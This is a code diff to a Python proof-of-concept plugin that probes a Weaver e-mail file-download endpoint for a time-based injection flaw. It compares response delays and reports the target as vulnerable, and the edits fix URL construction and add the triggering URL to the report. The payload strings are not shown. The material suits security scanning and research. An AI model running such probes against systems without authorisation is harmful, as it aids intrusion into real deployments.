@@ -36,7 +36,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             true_url='/weaver/weaver.email.FileDownloadLocation?fileid=32&download=1'
             start_time=time.time()
-            code, head, res, errcode, _ = hh.http(true_url)
+            code, head, res, errcode, _ = hh.http(self.target + true_url)
             end_time=time.time()
             true_time=end_time-start_time
             payloads = [
@@ -45,14 +45,13 @@ class Poc(ABPoc):
             ]
 
             for payload in payloads:
-                flase_url = '{target}'.format(target=self.target)+payload
+                flase_url = self.target+payload
                 start_time1 = time.time()
                 code1, head1, res1, errcode1, _ = hh.http(flase_url)
                 end_time1=time.time()
                 flase_time=end_time1-start_time1
-                       
                 if code == 200 and  flase_time>true_time and flase_time >5:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(target=self.target,name=self.vuln.name,url=flase_url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
